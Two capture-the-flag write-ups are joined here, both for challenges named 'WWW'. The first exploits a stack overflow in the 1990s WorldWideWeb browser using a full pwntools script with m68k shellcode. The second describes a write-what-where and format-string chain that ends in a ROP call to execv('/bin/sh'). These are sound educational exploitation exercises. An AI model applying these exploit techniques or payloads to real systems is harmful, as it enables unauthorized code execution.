WWW  
---  
www, aka pwning browsers from the 90s.

### Challenge Description

The challenge asks for a URL to be visited by the browser WorldWideWeb 0.15  
running on the NeXTSTEP OS (arch m68k).

Once submitted the URL, the challenges returns a set of screenshots captured  
during the execution of the browser.

### Vulnerability

First, by submitting a test URL and inspecting the returned screenshots, we
were  
able to identify the OS version and the browser. Then, we found and configured
a  
NeXTSTEP m68k emulator: http://previous.alternative-system.com/, on which we  
installed the WorldWideWeb browser and a version of gdb. We were also able to  
download the browser sources, from which we identified a classic stack
overflow.

In fact, the `HTTP_Get` function contains a 257 bytes buffer (`command`), used  
to perform the HTTP GET request, and then copies the URL into it without  
checking sizes:

```c  
#ifdef __STDC__  
int HTTP_Get(const char * arg)  
#else  
int HTTP_Get(arg)  
   char * arg;  
#endif  
{  
   int s;                  /* Socket number for returned data */  
   char command[257];      /* The whole command */  
   int status;             /* tcp return */

   ...

   strcpy(command, "GET ");  
   {  
       char * p1 = HTParse(arg, "", PARSE_PATH|PARSE_PUNCTUATION);  
       strcat(command, p1);  
       free(p1);  
   }

```

### Exploit

We were very happy to realize that no security measure (NX, ASLR,..) was  
implemented in the 90s. This means we could craft a shellcode, put it in the  
stack (together with a nice NOP sled), jump to it, and execute it.

After several attempts to write a working shellcode for m68k we were  
successfully able to execute commands. First, we tried by executing
`system("open flag")`,  
which runs a graphic text editor opening the flag file. However, on the remote  
machine the editor appeared behind the browser window, hiding half of the
flag.  
Second, we executed `cat flag`, looking at the output in the already opened  
console. Even in this case we failed, as last chars of the flag were still  
behind the browser window. Finally, by executing `cat flag` five times in our  
shellcode, we were able to see the entire flag.

Flag: `defconctf{Party_like_its_1992_for_the_next_Step}`

Exploit:

```python  
from pwn import *  
import base64  
import sys  
import time  
import os  
host = 'ddee3e1a.quals2018.oooverflow.io'  
port =  31337

def pow_hash(challenge, solution):  
   return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q',
solution)).hexdigest()

def check_pow(challenge, n, solution):  
   h = pow_hash(challenge, solution)  
   return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):  
   candidate = 0  
   while True:  
       if check_pow(challenge, n, candidate):  
           return candidate  
       candidate += 1

def connect():  
   global conn  
   conn.close()  
   conn = remote(host,port)  
   conn.recvuntil('Challenge: ')  
   challenge = conn.recvuntil('\n')[:-1]  
   conn.recvuntil('n: ')  
   n = int(conn.recvuntil('\n')[:-1])

   solution = solve_pow(challenge, n)  
   conn.sendline(str(solution))

conn = remote(host,port)  
connect()

filename = int(time.time())  
os.mkdir(str(filename))

DOUBLE_NOP = '\x4e\x71\x4e\x71'  
shellcode =
'\x2c\x4f\xb5\x82\x06\x82\x63\x61\x74\x20\x2c\xc2\xb5\x82\x06\x82\x66\x6c\x61\x67\x2c\xc2\xb5\x82\x06\x82\x3b\x20\x20\x20\x2c\xc2\xb5\x82\x06\x82\x63\x61\x74\x20\x2c\xc2\xb5\x82\x06\x82\x66\x6c\x61\x67\x2c\xc2\xb5\x82\x06\x82\x3b\x20\x20\x20\x2c\xc2\xb5\x82\x06\x82\x63\x61\x74\x20\x2c\xc2\xb5\x82\x06\x82\x66\x6c\x61\x67\x2c\xc2\xb5\x82\x06\x82\x3b\x20\x20\x20\x2c\xc2\xb5\x82\x06\x82\x63\x61\x74\x20\x2c\xc2\xb5\x82\x06\x82\x66\x6c\x61\x67\x2c\xc2\xb5\x82\x06\x82\x3b\x20\x20\x20\x2c\xc2\xb5\x82\x06\x82\x63\x61\x74\x20\x2c\xc2\xb5\x82\x06\x82\x66\x6c\x61\x67\x2c\xc2\xb5\x82\x06\x82\x3b\x20\x20\x20\x2c\xc2\xb5\x82\x06\x82\x63\x61\x74\x20\x2c\xc2\xb5\x82\x06\x82\x66\x6c\x61\x67\x2c\xc2\xb5\x82\x06\x82\x3b\x20\x20\x20\x2c\xc2\xb5\x82\x2c\xc2\x22\x0f\x59\x8f\x2e\x81\x2c\x4f\x45\xf9\x05\x03\x07\xf8\x4e\x92'

payload = 'http://'  
payload += 'a' * (259 - len(payload))  
payload += '\x03\xff\xf7\xf8' * 8  
payload += DOUBLE_NOP * 100  
payload += shellcode

while True:  
   conn.recvuntil("Welcome to the pre-alpha web aka ")  
   token = conn.recvuntil("\n")[:-1]  
log.info("Token : "+token)  
   conn.recvuntil("What URL would you like this old dog to fetch?\n")  
   print 'sending:'  
   print payload  
   print payload.encode('hex')  
   conn.sendline(payload)  
   i = 0  
   while True:  
       cose = conn.recvuntil("DEBUG ")[:-6]  
       if(len(cose)>0):  
log.info(cose)  
       b64 = base64.b64decode(conn.recvline())  
       f = open('./'+str(filename) + "/image"+str(i).rjust(4,"0")+".png","w")  
       f.write(b64)  
       f.close()  
log.info("Saved image"+str(i)+".png")  
       i += 1

```  

Original writeup
(https://mhackeroni.it/archive/2018/05/20/defconctfquals-2018-all-
writeups.html).# WWW

This task was part of the 'PWN' category at the 2020 Hexion CTF (during 11-13
April 2020).  
It was solved by [or523](https://github.com/or523), in [The
Maccabees](https://ctftime.org/team/60231) team.

My full solution is available [here](solve.py).

## The challenge

The challenge is a very simple pwning challenge. We get a netcat access to a
server running the following code:

```c  
#include <stdio.h>  
#include <stdlib.h>  
#include <unistd.h>

void write(char what, long long int where, char* buf) {  
   buf[where] = what;  
}

char what() {  
   char what;  
   scanf("%c", &what);  
   getchar();  
   return what;  
}

long long int where() {  
   long long int where;  
   scanf("%lld", &where);  
   getchar();  
   return where;  
}

int main(void) {  
	setvbuf(stdout, NULL, _IONBF, 0);  
   int amount = 1;  
   char buf[] = "Hello World!";  
   while (amount--) {  
       write(what(), where(), buf);  
   }  
   printf(buf);  
}  
```

Basically, we get here a write primitive of a controlled byte-value, to a
controlled offset from some buffer on the stack.  
When the function finishes, this buffer on the stack is used as the first
argument for `printf` (as a format string).

The goal is, of course - to execute arbitrary code on the server.

## The solution

### Observations

Some simple initial observations:

1. The binary itself is not randomized (but `libc` and the stack are).  
2. The order to the `what()` and `where()` invocations swapped in compilation (parameters to a function are not evaluated in a defined order in C).

### Improving the write primitive

The main thing holding us back is that we can only use the primitive once -
the `amount` variable is initialized to 1. But in the compiled binary, this
variable is also stored on the stack (in offset of `-7` bytes from `buffer`) -
which mean we can use our first write primitive in order to overwrite the
`amount` variable.  
Meaning - we can improve the primitive in order to gain as many WWW primitives
as we want.

### Leaking addresses

Now that we have the ability to write as many bytes as we want - we understand
that we need to leak addresses of the memory space: leaking the stack would
allow us to convert our relative-write primitive to absolute-write (because we
would know the base of the write); and leaking `libc` would give us the
addresses of useful gadgets for code executions.

Leaking these addresses can be used by abusing the fact we control the format
string to the `printf` function. For example - we can abuse the `"%15$p"`
feature of format-strings, in order to leak the "15th argument" of `printf`
(meaning we can just leak data from any offset of the stack we want). By
trial-and-error, we get to the following conclusions:

1. `"%13$p"` is the return address of the `main` address, which is an address inside `libc` - of the `__libc_start_main` function.  
2. `"%15$p"` is an address of the stack, which is in constant offset from `buffer`.

### Resuming execution after leak

Notice a caveat in the leaking primitive - the `printf` function is called
only after we finish the loop of write primitives. In order to keep using the
write primitives after we finish, we can control execution and jump back to
the `_start` function - which will cause the program to re-start again.

There are 2 ways we control the execution to reuse the write primitive after a
leak:

1. Override the return address (constant offset from `buffer` on the stack).  
2. If we have an absolute-write primitive (after we've leaked a stack address) - we can overwrite the `__stack_chk_fail` GOT entry to our own address, and then overwrite the stack cookie of the `main` function with some wrong value.

We can't rely only on the first method, because one of the addresses we want
to leak **is **the return address, and if we'll overwrite it - the `printf`
obviously won't be able to leak the original value.

### Code execution

After leaking the addresses of both `libc` and the stack, we can just write
our ROP chain to the stack. This is a rather simple ROP chain, which ends of
calling `execv("/bin/sh", {"/bin/sh", NULL})` (using our write primitive and
addresses from libc).

### Final Exploit Flow

1. First session:  
  1. Increase write-primitive amount by overwriting `amount` variable.  
  2. Write `"%15$p"` to the format string in order to leak a stack address.  
  3. Write `_start` address to the return address to start a new session of WWW primitives.  
  4. Finish loop and leak stack address! (now we have absolute R/W primitive).  
2. Second session:  
  1. Increase write-primitive amount by overwriting `amount` variable.  
  2. Write `"%13$p"` to the format string in order to leak a `libc` address.  
  3. Write `_start` address to the GOT entry of `__stack_chk_fail`.  
  4. Write 0 on the stack cookie.  
  5. Finish loop and leak libc address!  
3. Third session:  
  1. Increase write-primitive amount by overwriting `amount` variable.  
  2. Write necessary information (like `argv`) to a data cave in the `.data` section.  
  3. Construct `execv("/bin/sh", {"/bin/sh", NULL})` ROP chain and write it on the stack.  
  4.  Finish loop to achieve code execution!

After running shell, we can `cat` the flag from a file, which is:
`hexCTF{wh0_wh1ch_why_wh3n?}`.

## Aftermath

After reading some write-ups, turns out my solution is way more complex than
it should be (this was also my assumption during the CTF).

My mistake was overlooking some offsets that could allow me to leak `libc`
while still overwriting the return address (such as `%29$p`), allowing me to
skip the third session. I think the reason this offset didn't work for me is
that I tried to make the exploit generic to both my own and the remote `libc`,
and the stack offsets beyond the `main` function has changed too much to be
consistent.

Thanks for reading!

~ **or523**

Original writeup (https://github.com/TheMaccabees/ctf-
writeups/blob/master/HexionCTF2020/WWW/README.md).